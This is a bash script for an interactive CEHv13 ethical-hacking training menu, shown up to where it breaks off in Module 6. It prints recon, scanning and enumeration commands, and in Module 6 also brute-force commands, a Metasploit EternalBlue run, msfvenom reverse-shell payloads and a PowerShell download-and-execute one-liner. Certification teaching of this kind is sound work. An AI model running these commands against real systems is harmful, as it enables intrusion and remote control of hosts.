#!/bin/bash

# ╔═══════════════════════════════════════════════════════════════════════════════╗
# ║                         CEHv13 Master Learning Platform                      ║
# ║                              by DK Cyber                                     ║
# ║                                                                               ║
# ║           🎯 Master This With Practical • Theory • Real-World Expertise      ║
# ║                                                                               ║
# ║  Complete Ethical Hacking Certification Training for Cybersecurity Masters   ║
# ╚═══════════════════════════════════════════════════════════════════════════════╝

# Author: DK Cyber - Cybersecurity Education & Training
# Version: 2.0 - Enhanced Master Edition
# Platform: Kali Linux Optimized
# Purpose: Complete CEHv13 Certification Preparation
# Website: Your expertise journey starts here
# Support: Advanced practical training with real-world scenarios

# Colors for enhanced visualization
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
MAGENTA='\033[1;35m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
NC='\033[0m' # No Color

# Learning progress tracking
PROGRESS_FILE="$HOME/.cehv13_dkcyber_progress"
CONFIG_FILE="$HOME/.cehv13_dkcyber_config"

# Initialize progress file if it doesn't exist
if [ ! -f "$PROGRESS_FILE" ]; then
    for i in {1..20}; do
        echo "module_$i=0" >> "$PROGRESS_FILE"
    done
    echo "start_date=$(date +%Y-%m-%d)" >> "$PROGRESS_FILE"
    echo "total_hours=0" >> "$PROGRESS_FILE"
fi

# Function to update progress with time tracking
update_progress() {
    local module=$1
    local current_time=$(date +%H:%M:%S)
    sed -i "s/module_$module=0/module_$module=1/" "$PROGRESS_FILE"
    echo "module_${module}_completed=$(date +%Y-%m-%d\ %H:%M:%S)" >> "$PROGRESS_FILE"
    echo -e "${GREEN}✅ Module $module completed at $current_time!${NC}"
    echo -e "${CYAN}🎉 You're one step closer to CEHv13 mastery!${NC}"
}

# Enhanced progress display
show_progress() {
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                    YOUR LEARNING JOURNEY                     ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    local completed=0
    local total_modules=20
    
    for i in {1..20}; do
        local status=$(grep "module_$i=" "$PROGRESS_FILE" | cut -d'=' -f2)
        if [ "$status" = "1" ]; then
            echo -e "${GREEN}✅${NC} Module $i: ${GREEN}${BOLD}Completed${NC} ${CYAN}(Mastered)${NC}"
            ((completed++))
        else
            echo -e "${YELLOW}⏳${NC} Module $i: ${YELLOW}Pending${NC} ${MAGENTA}(Ready to Learn)${NC}"
        fi
    done
    
    local percentage=$((completed * 100 / total_modules))
    
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                    PROGRESS ANALYTICS                        ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📊 Overall Progress: ${WHITE}${BOLD}$completed/$total_modules modules${NC} ${YELLOW}($percentage%)${NC}"
    
    # Progress bar
    local bar_length=50
    local filled_length=$((percentage * bar_length / 100))
    local bar=""
    for ((i=0; i<filled_length; i++)); do bar+="█"; done
    for ((i=filled_length; i<bar_length; i++)); do bar+="░"; done
    echo -e "${CYAN}Progress: ${GREEN}$bar${NC} ${YELLOW}$percentage%${NC}"
    
    # Motivational messages based on progress
    if [ $percentage -eq 100 ]; then
        echo -e "\n${GREEN}🎉 CONGRATULATIONS! 🎉${NC}"
        echo -e "${GOLD}${BOLD}You've completed the entire CEHv13 curriculum!${NC}"
        echo -e "${CYAN}You're now ready to take the certification exam!${NC}"
    elif [ $percentage -ge 75 ]; then
        echo -e "\n${GREEN}🚀 Excellent Progress!${NC} You're in the final stretch!"
    elif [ $percentage -ge 50 ]; then
        echo -e "\n${YELLOW}⚡ Great Work!${NC} You're halfway to mastery!"
    elif [ $percentage -ge 25 ]; then
        echo -e "\n${CYAN}📈 Good Start!${NC} Keep building your expertise!"
    else
        echo -e "\n${MAGENTA}🌟 Welcome!${NC} Your cybersecurity journey begins here!"
    fi
    
    # Learning tips
    echo -e "\n${BLUE}💡 ${BOLD}Learning Tips:${NC}"
    echo -e "${WHITE}• Practice commands in a safe lab environment${NC}"
    echo -e "${WHITE}• Take notes for better retention${NC}"
    echo -e "${WHITE}• Apply theory with hands-on exercises${NC}"
    echo -e "${WHITE}• Join cybersecurity communities for support${NC}\n"
}

# Enhanced header with DK Cyber branding
show_header() {
    clear
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                            CEHv13 by DK Cyber                                ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}║${CYAN}${BOLD}                     Master Learning Platform - Kali Edition                  ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║${YELLOW}        🎯 Master This With: ${WHITE}Practical ${YELLOW}• ${WHITE}Theory ${YELLOW}• ${WHITE}Real-World Expertise         ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${MAGENTA}${BOLD}🚀 Complete Ethical Hacking Certification Training for Cybersecurity Masters${NC}"
    echo -e "${CYAN}📚 Learn • 💻 Practice • 🛡️ Master • 🏆 Certify • 🌟 Excel${NC}"
    
    # Dynamic welcome message
    local current_hour=$(date +%H)
    local greeting=""
    if [ $current_hour -lt 12 ]; then
        greeting="Good Morning"
    elif [ $current_hour -lt 17 ]; then
        greeting="Good Afternoon"
    else
        greeting="Good Evening"
    fi
    
    echo -e "\n${GREEN}$greeting, Ethical Hacker!${NC} ${YELLOW}Ready to enhance your cybersecurity expertise?${NC}\n"
}

# Enhanced main menu with better styling
show_main_menu() {
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                            CEHv13 LEARNING MODULES                           ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${WHITE}${BOLD}📚 DAY 1 - FOUNDATIONS${NC} ${CYAN}(Build Your Base Knowledge)${NC}"
    echo -e "${GREEN}  1.${NC}  Introduction to Ethical Hacking      ${YELLOW}⭐ Start Here${NC}"
    echo -e "${GREEN}  2.${NC}  Footprinting and Reconnaissance      ${CYAN}🔍 Intel Gathering${NC}"
    echo -e "${GREEN}  3.${NC}  Scanning Networks                    ${CYAN}🌐 Network Discovery${NC}"
    echo -e "${GREEN}  4.${NC}  Enumeration                          ${CYAN}📋 Service Analysis${NC}"
    echo -e "${GREEN}  5.${NC}  Vulnerability Analysis               ${CYAN}🔍 Weakness Detection${NC}"
    
    echo -e "\n${WHITE}${BOLD}🔥 DAY 2 - ATTACKS & THREATS${NC} ${RED}(Learn Attack Techniques)${NC}"
    echo -e "${GREEN}  6.${NC}  System Hacking                       ${RED}💥 System Compromise${NC}"
    echo -e "${GREEN}  7.${NC}  Malware Threats                      ${RED}🦠 Malicious Software${NC}"
    echo -e "${GREEN}  8.${NC}  Sniffing                            ${RED}📡 Traffic Interception${NC}"
    echo -e "${GREEN}  9.${NC}  Social Engineering                   ${RED}🎭 Human Psychology${NC}"
    echo -e "${GREEN} 10.${NC}  Denial-of-Service                    ${RED}⚡ Service Disruption${NC}"
    
    echo -e "\n${WHITE}${BOLD}⚡ DAY 3 - ADVANCED TECHNIQUES${NC} ${PURPLE}(Master Advanced Skills)${NC}"
    echo -e "${GREEN} 11.${NC}  Session Hijacking                    ${PURPLE}🔓 Session Attacks${NC}"
    echo -e "${GREEN} 12.${NC}  Evading IDS, Firewalls & Honeypots  ${PURPLE}🥷 Stealth Techniques${NC}"
    echo -e "${GREEN} 13.${NC}  Hacking Web Servers                  ${PURPLE}🌐 Server Exploitation${NC}"
    echo -e "${GREEN} 14.${NC}  Hacking Web Applications             ${PURPLE}🕸️ App Security Testing${NC}"
    echo -e "${GREEN} 15.${NC}  SQL Injection                       ${PURPLE}💉 Database Attacks${NC}"
    
    echo -e "\n${WHITE}${BOLD}🚀 DAY 4 - SPECIALIZED DOMAINS${NC} ${ORANGE}(Expert-Level Topics)${NC}"
    echo -e "${GREEN} 16.${NC}  Hacking Wireless Networks            ${ORANGE}📶 WiFi Security${NC}"
    echo -e "${GREEN} 17.${NC}  Hacking Mobile Platforms             ${ORANGE}📱 Mobile Security${NC}"
    echo -e "${GREEN} 18.${NC}  IoT and OT Hacking                   ${ORANGE}🏭 Industrial Systems${NC}"
    echo -e "${GREEN} 19.${NC}  Cloud Computing                      ${ORANGE}☁️ Cloud Security${NC}"
    echo -e "${GREEN} 20.${NC}  Cryptography                         ${ORANGE}🔐 Encryption & Hashes${NC}"
    
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                            SPECIAL FEATURES                                  ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${PURPLE}${BOLD}🎯 Learning Tools:${NC}"
    echo -e "${CYAN} 21.${NC}  📊 Show Progress & Analytics"
    echo -e "${CYAN} 22.${NC}  ⚡ Quick Review Mode (Cheat Sheet)"
    echo -e "${CYAN} 23.${NC}  💻 Practice Commands & Lab Setup"
    echo -e "${CYAN} 24.${NC}  🏆 Certification Prep & Tips"
    echo -e "${CYAN} 25.${NC}  🌟 About DK Cyber & Resources"
    echo -e "${RED}  0.${NC}   🚪 Exit Platform"
    
    echo -e "\n${YELLOW}${BOLD}╭─────────────────────────────────────────────────────────────────────────────────╮${NC}"
    echo -e "${YELLOW}${BOLD}│${NC} ${WHITE}Enter your choice (1-25 or 0):${NC} ${YELLOW}_____________________________________${NC} ${YELLOW}${BOLD}│${NC}"
    echo -e "${YELLOW}${BOLD}╰─────────────────────────────────────────────────────────────────────────────────╯${NC}"
    echo -ne "${WHITE}${BOLD}➤ ${NC}"
}

# New function for About DK Cyber
show_about() {
    show_header
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                          ABOUT DK CYBER                                      ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${CYAN}${BOLD}🌟 Mission:${NC}"
    echo -e "${WHITE}Empowering the next generation of cybersecurity professionals through${NC}"
    echo -e "${WHITE}comprehensive, practical, and real-world focused training.${NC}\n"
    
    echo -e "${CYAN}${BOLD}🎯 Our Approach:${NC}"
    echo -e "${GREEN}✅ Theory:${NC} ${WHITE}Solid conceptual understanding${NC}"
    echo -e "${GREEN}✅ Practical:${NC} ${WHITE}Hands-on lab exercises and real tools${NC}"
    echo -e "${GREEN}✅ Real-World:${NC} ${WHITE}Industry scenarios and case studies${NC}"
    echo -e "${GREEN}✅ Expertise:${NC} ${WHITE}Advanced techniques and methodologies${NC}\n"
    
    echo -e "${CYAN}${BOLD}🏆 What Makes This Special:${NC}"
    echo -e "${YELLOW}• Complete CEHv13 curriculum coverage${NC}"
    echo -e "${YELLOW}• Interactive learning with progress tracking${NC}"
    echo -e "${YELLOW}• Real Kali Linux commands and tools${NC}"
    echo -e "${YELLOW}• Practice labs and safe environments${NC}"
    echo -e "${YELLOW}• Industry-relevant case studies${NC}"
    echo -e "${YELLOW}• Certification exam preparation${NC}\n"
    
    echo -e "${CYAN}${BOLD}📚 Learning Resources:${NC}"
    echo -e "${WHITE}• 20 comprehensive modules${NC}"
    echo -e "${WHITE}• 500+ practical commands${NC}"
    echo -e "${WHITE}• Real-world scenarios${NC}"
    echo -e "${WHITE}• Progress tracking system${NC}"
    echo -e "${WHITE}• Quick reference guides${NC}\n"
    
    echo -e "${GREEN}${BOLD}🚀 Your Success is Our Priority!${NC}\n"
    echo -e "${YELLOW}Press Enter to return to main menu...${NC}"
    read
}

# New function for certification tips
show_cert_tips() {
    show_header
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}${BOLD}                      CEHv13 CERTIFICATION PREPARATION                        ${NC}${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${CYAN}${BOLD}🎯 Exam Overview:${NC}"
    echo -e "${WHITE}• Questions: 125 multiple choice${NC}"
    echo -e "${WHITE}• Duration: 4 hours${NC}"
    echo -e "${WHITE}• Passing Score: 70%${NC}"
    echo -e "${WHITE}• Format: Computer-based${NC}\n"
    
    echo -e "${CYAN}${BOLD}📚 Study Strategy:${NC}"
    echo -e "${GREEN}1. Complete all 20 modules systematically${NC}"
    echo -e "${GREEN}2. Practice commands in lab environments${NC}"
    echo -e "${GREEN}3. Take practice exams regularly${NC}"
    echo -e "${GREEN}4. Focus on weak areas identified${NC}"
    echo -e "${GREEN}5. Review real-world case studies${NC}\n"
    
    echo -e "${CYAN}${BOLD}⏰ Recommended Timeline:${NC}"
    echo -e "${YELLOW}Week 1-2: Modules 1-10 (Foundations & Attacks)${NC}"
    echo -e "${YELLOW}Week 3: Modules 11-15 (Advanced Techniques)${NC}"
    echo -e "${YELLOW}Week 4: Modules 16-20 (Specialized Domains)${NC}"
    echo -e "${YELLOW}Week 5: Review, practice exams, and reinforcement${NC}\n"
    
    echo -e "${CYAN}${BOLD}🔥 Exam Tips:${NC}"
    echo -e "${WHITE}• Read questions carefully and completely${NC}"
    echo -e "${WHITE}• Eliminate obviously wrong answers first${NC}"
    echo -e "${WHITE}• Manage your time (about 2 minutes per question)${NC}"
    echo -e "${WHITE}• Mark difficult questions for review${NC}"
    echo -e "${WHITE}• Trust your preparation and instincts${NC}\n"
    
    echo -e "${GREEN}${BOLD}🏆 You've Got This! Success Awaits!${NC}\n"
    echo -e "${YELLOW}Press Enter to return to main menu...${NC}"
    read
}

# Module 1: Introduction to Ethical Hacking
module_1() {
    show_header
    echo -e "${BLUE}=== MODULE 1: INTRODUCTION TO ETHICAL HACKING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Ethical hacking involves authorized testing of systems to find vulnerabilities"
    echo -e "before malicious hackers do. Learn the fundamentals and methodology.\n"
    
    echo -e "${WHITE}🎯 KEY CONCEPTS:${NC}"
    echo -e "• ${GREEN}White Hat${NC}: Ethical hackers (good guys)"
    echo -e "• ${RED}Black Hat${NC}: Malicious hackers (bad guys)"
    echo -e "• ${YELLOW}Gray Hat${NC}: Between ethical and malicious"
    echo -e "• ${BLUE}Penetration Testing${NC}: Authorized security testing"
    echo -e "• ${PURPLE}Vulnerability Assessment${NC}: Finding security weaknesses\n"
    
    echo -e "${WHITE}🔧 HACKING PHASES:${NC}"
    echo -e "1. ${CYAN}Reconnaissance${NC} - Information gathering"
    echo -e "2. ${CYAN}Scanning${NC} - Finding live systems and services"
    echo -e "3. ${CYAN}Gaining Access${NC} - Exploiting vulnerabilities"
    echo -e "4. ${CYAN}Maintaining Access${NC} - Keeping persistent access"
    echo -e "5. ${CYAN}Covering Tracks${NC} - Hiding evidence\n"
    
    echo -e "${WHITE}💻 PRACTICAL EXAMPLES:${NC}"
    echo -e "${GREEN}# Check your Kali Linux version${NC}"
    echo -e "cat /etc/os-release"
    echo -e "\n${GREEN}# Update Kali tools${NC}"
    echo -e "sudo apt update && sudo apt upgrade -y"
    echo -e "\n${GREEN}# List installed hacking tools${NC}"
    echo -e "ls /usr/share/wordlists"
    echo -e "\n${GREEN}# Check network interface${NC}"
    echo -e "ifconfig"
    
    echo -e "\n${WHITE}⚖️ LEGAL CONSIDERATIONS:${NC}"
    echo -e "• Always get written authorization before testing"
    echo -e "• Follow scope of engagement"
    echo -e "• Document everything for reporting"
    echo -e "• Respect privacy and confidentiality\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 1
}

# Module 2: Footprinting and Reconnaissance
module_2() {
    show_header
    echo -e "${BLUE}=== MODULE 2: FOOTPRINTING AND RECONNAISSANCE ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Information gathering about target organization, systems, and networks"
    echo -e "without directly interacting with target systems.\n"
    
    echo -e "${WHITE}🎯 TYPES OF RECONNAISSANCE:${NC}"
    echo -e "• ${GREEN}Passive${NC}: No direct contact with target"
    echo -e "• ${RED}Active${NC}: Direct interaction with target systems\n"
    
    echo -e "${WHITE}🔍 INFORMATION SOURCES:${NC}"
    echo -e "• Social media platforms"
    echo -e "• Company websites and job postings"
    echo -e "• WHOIS databases"
    echo -e "• DNS records"
    echo -e "• Search engines\n"
    
    echo -e "${WHITE}💻 PRACTICAL COMMANDS:${NC}"
    echo -e "${GREEN}# WHOIS lookup${NC}"
    echo -e "whois google.com"
    echo -e "\n${GREEN}# DNS enumeration${NC}"
    echo -e "dig google.com"
    echo -e "nslookup google.com"
    echo -e "\n${GREEN}# Subdomain enumeration${NC}"
    echo -e "sublist3r -d google.com"
    echo -e "\n${GREEN}# Google dorking examples${NC}"
    echo -e 'site:target.com filetype:pdf'
    echo -e 'intitle:"index of" site:target.com'
    echo -e "\n${GREEN}# Social media reconnaissance${NC}"
    echo -e "sherlock username"
    echo -e "\n${GREEN}# Email harvesting${NC}"
    echo -e "theHarvester -d target.com -l 100 -b google"
    echo -e "\n${GREEN}# Website technology detection${NC}"
    echo -e "whatweb target.com"
    
    echo -e "\n${WHITE}🛠️ RECOMMENDED TOOLS:${NC}"
    echo -e "• ${CYAN}Maltego${NC} - Information gathering and link analysis"
    echo -e "• ${CYAN}Recon-ng${NC} - Web reconnaissance framework"
    echo -e "• ${CYAN}theHarvester${NC} - Email, subdomain and people names harvester"
    echo -e "• ${CYAN}Shodan${NC} - Search engine for Internet-connected devices\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 2
}

# Module 3: Scanning Networks
module_3() {
    show_header
    echo -e "${BLUE}=== MODULE 3: SCANNING NETWORKS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Network scanning involves discovering live hosts, open ports, and running"
    echo -e "services on target networks using various scanning techniques.\n"
    
    echo -e "${WHITE}🎯 SCANNING TYPES:${NC}"
    echo -e "• ${GREEN}Network Discovery${NC}: Finding live hosts"
    echo -e "• ${GREEN}Port Scanning${NC}: Identifying open ports"
    echo -e "• ${GREEN}Service Detection${NC}: Determining running services"
    echo -e "• ${GREEN}OS Fingerprinting${NC}: Identifying operating systems\n"
    
    echo -e "${WHITE}🚀 TCP SCAN TYPES:${NC}"
    echo -e "• ${CYAN}-sS${NC}: SYN Stealth scan (default)"
    echo -e "• ${CYAN}-sT${NC}: TCP Connect scan"
    echo -e "• ${CYAN}-sF${NC}: FIN scan"
    echo -e "• ${CYAN}-sX${NC}: Xmas scan"
    echo -e "• ${CYAN}-sN${NC}: NULL scan\n"
    
    echo -e "${WHITE}💻 NMAP COMMANDS:${NC}"
    echo -e "${GREEN}# Basic host discovery${NC}"
    echo -e "nmap -sn 192.168.1.0/24"
    echo -e "\n${GREEN}# Quick port scan${NC}"
    echo -e "nmap -T4 -F 192.168.1.100"
    echo -e "\n${GREEN}# Comprehensive scan${NC}"
    echo -e "nmap -A -T4 192.168.1.100"
    echo -e "\n${GREEN}# Service version detection${NC}"
    echo -e "nmap -sV 192.168.1.100"
    echo -e "\n${GREEN}# OS detection${NC}"
    echo -e "nmap -O 192.168.1.100"
    echo -e "\n${GREEN}# Stealth scan${NC}"
    echo -e "nmap -sS -T2 192.168.1.100"
    echo -e "\n${GREEN}# UDP scan${NC}"
    echo -e "nmap -sU --top-ports 100 192.168.1.100"
    echo -e "\n${GREEN}# NSE scripts${NC}"
    echo -e "nmap --script vuln 192.168.1.100"
    
    echo -e "\n${WHITE}⚡ OTHER SCANNING TOOLS:${NC}"
    echo -e "• ${CYAN}Masscan${NC}: High-speed port scanner"
    echo -e "• ${CYAN}Zmap${NC}: Internet-wide network scanner"
    echo -e "• ${CYAN}Unicornscan${NC}: Flexible port scanner"
    echo -e "• ${CYAN}Angry IP Scanner${NC}: GUI network scanner\n"
    
    echo -e "${WHITE}🛡️ EVASION TECHNIQUES:${NC}"
    echo -e "• Slow scan timing (-T1, -T2)"
    echo -e "• Fragment packets (-f)"
    echo -e "• Decoy scans (-D)"
    echo -e "• Source port spoofing (--source-port)\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 3
}

# Module 4: Enumeration
module_4() {
    show_header
    echo -e "${BLUE}=== MODULE 4: ENUMERATION ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Enumeration involves extracting detailed information about identified"
    echo -e "services, user accounts, and system configurations.\n"
    
    echo -e "${WHITE}🎯 ENUMERATION TARGETS:${NC}"
    echo -e "• ${GREEN}NetBIOS${NC}: Windows network service"
    echo -e "• ${GREEN}SNMP${NC}: Network management protocol"
    echo -e "• ${GREEN}LDAP${NC}: Directory access protocol"
    echo -e "• ${GREEN}NTP${NC}: Network time protocol"
    echo -e "• ${GREEN}SMTP${NC}: Email service"
    echo -e "• ${GREEN}DNS${NC}: Domain name service\n"
    
    echo -e "${WHITE}💻 NETBIOS ENUMERATION:${NC}"
    echo -e "${GREEN}# NBTScan${NC}"
    echo -e "nbtscan 192.168.1.0/24"
    echo -e "\n${GREEN}# Enum4linux${NC}"
    echo -e "enum4linux -a 192.168.1.100"
    echo -e "\n${GREEN}# SMB enumeration${NC}"
    echo -e "smbclient -L //192.168.1.100"
    echo -e "smbmap -H 192.168.1.100"
    
    echo -e "\n${WHITE}💻 SNMP ENUMERATION:${NC}"
    echo -e "${GREEN}# SNMP walk${NC}"
    echo -e "snmpwalk -c public -v1 192.168.1.100"
    echo -e "\n${GREEN}# SNMP check${NC}"
    echo -e "snmp-check 192.168.1.100"
    echo -e "\n${GREEN}# Onesixtyone${NC}"
    echo -e "onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt 192.168.1.100"
    
    echo -e "\n${WHITE}💻 LDAP ENUMERATION:${NC}"
    echo -e "${GREEN}# LDAP search${NC}"
    echo -e "ldapsearch -x -h 192.168.1.100 -s base"
    echo -e "\n${GREEN}# Anonymous bind${NC}"
    echo -e "ldapsearch -x -h 192.168.1.100 -b 'dc=domain,dc=com'"
    
    echo -e "\n${WHITE}💻 SMTP ENUMERATION:${NC}"
    echo -e "${GREEN}# SMTP user enumeration${NC}"
    echo -e "smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.100"
    echo -e "\n${GREEN}# Manual SMTP commands${NC}"
    echo -e "telnet 192.168.1.100 25"
    echo -e "VRFY root"
    echo -e "EXPN root"
    
    echo -e "\n${WHITE}💻 DNS ENUMERATION:${NC}"
    echo -e "${GREEN}# DNS zone transfer${NC}"
    echo -e "dig axfr @192.168.1.100 domain.com"
    echo -e "\n${GREEN}# Fierce DNS scanner${NC}"
    echo -e "fierce -dns domain.com"
    echo -e "\n${GREEN}# DNSrecon${NC}"
    echo -e "dnsrecon -d domain.com -t axfr"
    
    echo -e "\n${WHITE}🛠️ AUTOMATED ENUMERATION:${NC}"
    echo -e "• ${CYAN}AutoRecon${NC}: Multi-threaded network reconnaissance"
    echo -e "• ${CYAN}LinEnum${NC}: Linux enumeration script"
    echo -e "• ${CYAN}WinPEAS${NC}: Windows privilege escalation checker\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 4
}

# Module 5: Vulnerability Analysis
module_5() {
    show_header
    echo -e "${BLUE}=== MODULE 5: VULNERABILITY ANALYSIS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Systematic examination of systems to identify security weaknesses,"
    echo -e "misconfigurations, and vulnerabilities that could be exploited.\n"
    
    echo -e "${WHITE}🎯 VULNERABILITY TYPES:${NC}"
    echo -e "• ${RED}Critical${NC}: Immediate exploitation risk"
    echo -e "• ${YELLOW}High${NC}: Significant security impact"
    echo -e "• ${BLUE}Medium${NC}: Moderate risk"
    echo -e "• ${GREEN}Low${NC}: Minimal impact"
    echo -e "• ${PURPLE}Informational${NC}: No direct security impact\n"
    
    echo -e "${WHITE}💻 NESSUS ALTERNATIVE TOOLS:${NC}"
    echo -e "${GREEN}# OpenVAS${NC}"
    echo -e "sudo openvas-setup"
    echo -e "sudo openvas-start"
    echo -e "\n${GREEN}# Nikto web scanner${NC}"
    echo -e "nikto -h http://192.168.1.100"
    echo -e "\n${GREEN}# Nuclei scanner${NC}"
    echo -e "nuclei -u http://192.168.1.100"
    echo -e "\n${GREEN}# Nmap vulnerability scripts${NC}"
    echo -e "nmap --script vuln 192.168.1.100"
    
    echo -e "\n${WHITE}💻 WEB APPLICATION SCANNING:${NC}"
    echo -e "${GREEN}# OWASP ZAP${NC}"
    echo -e "zaproxy"
    echo -e "\n${GREEN}# Burp Suite Community${NC}"
    echo -e "burpsuite"
    echo -e "\n${GREEN}# Dirb directory scanner${NC}"
    echo -e "dirb http://192.168.1.100"
    echo -e "\n${GREEN}# Gobuster${NC}"
    echo -e "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    
    echo -e "\n${WHITE}💻 DATABASE SCANNING:${NC}"
    echo -e "${GREEN}# SQLmap${NC}"
    echo -e "sqlmap -u 'http://target.com/page.php?id=1' --dbs"
    echo -e "\n${GREEN}# MySQL scanner${NC}"
    echo -e "nmap --script mysql-enum 192.168.1.100"
    
    echo -e "\n${WHITE}📊 VULNERABILITY DATABASES:${NC}"
    echo -e "• ${CYAN}CVE${NC}: Common Vulnerabilities and Exposures"
    echo -e "• ${CYAN}NVD${NC}: National Vulnerability Database"
    echo -e "• ${CYAN}CVSS${NC}: Common Vulnerability Scoring System"
    echo -e "• ${CYAN}ExploitDB${NC}: Exploit database\n"
    
    echo -e "${WHITE}🔍 MANUAL CHECKS:${NC}"
    echo -e "${GREEN}# Check for default credentials${NC}"
    echo -e "hydra -L users.txt -P passwords.txt ssh://192.168.1.100"
    echo -e "\n${GREEN}# SSL/TLS testing${NC}"
    echo -e "testssl.sh https://192.168.1.100"
    echo -e "\n${GREEN}# Search exploits${NC}"
    echo -e "searchsploit apache 2.4"
    
    echo -e "\n${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 5
}

# Module 6: System Hacking
module_6() {
    show_header
    echo -e "${BLUE}=== MODULE 6: SYSTEM HACKING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "System hacking involves gaining unauthorized access to computer systems"
    echo -e "by exploiting vulnerabilities and maintaining persistent access.\n"
    
    echo -e "${WHITE}🎯 ATTACK PHASES:${NC}"
    echo -e "• ${GREEN}Gaining Access${NC}: Initial system compromise"
    echo -e "• ${GREEN}Escalating Privileges${NC}: Obtaining higher-level access"
    echo -e "• ${GREEN}Executing Applications${NC}: Running malicious code"
    echo -e "• ${GREEN}Hiding Files${NC}: Concealing malicious activities"
    echo -e "• ${GREEN}Covering Tracks${NC}: Removing evidence\n"
    
    echo -e "${WHITE}💻 PASSWORD ATTACKS:${NC}"
    echo -e "${GREEN}# Hydra brute force${NC}"
    echo -e "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100"
    echo -e "\n${GREEN}# John the Ripper${NC}"
    echo -e "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
    echo -e "\n${GREEN}# Hashcat${NC}"
    echo -e "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt"
    echo -e "\n${GREEN}# Medusa${NC}"
    echo -e "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh"
    
    echo -e "\n${WHITE}💻 METASPLOIT FRAMEWORK:${NC}"
    echo -e "${GREEN}# Start Metasploit${NC}"
    echo -e "msfconsole"
    echo -e "\n${GREEN}# Search exploits${NC}"
    echo -e "search type:exploit platform:windows"
    echo -e "\n${GREEN}# Use exploit${NC}"
    echo -e "use exploit/windows/smb/ms17_010_eternalblue"
    echo -e "set RHOSTS 192.168.1.100"
    echo -e "set payload windows/x64/meterpreter/reverse_tcp"
    echo -e "set LHOST 192.168.1.50"
    echo -e "exploit"
    
    echo -e "\n${WHITE}💻 PRIVILEGE ESCALATION:${NC}"
    echo -e "${GREEN}# Linux enumeration${NC}"
    echo -e "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
    echo -e "chmod +x LinEnum.sh && ./LinEnum.sh"
    echo -e "\n${GREEN}# Windows enumeration${NC}"
    echo -e "powershell -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\"); Invoke-AllChecks'"
    echo -e "\n${GREEN}# SUID files (Linux)${NC}"
    echo -e "find / -perm -u=s -type f 2>/dev/null"
    
    echo -e "\n${WHITE}💻 PAYLOAD GENERATION:${NC}"
    echo -e "${GREEN}# Msfvenom payloads${NC}"
    echo -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe"
    echo -e "\n${GREEN}# Linux payload${NC}"
    echo -e "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > payload.elf"
    echo -e "\n${GREEN}# Web payload${NC}"
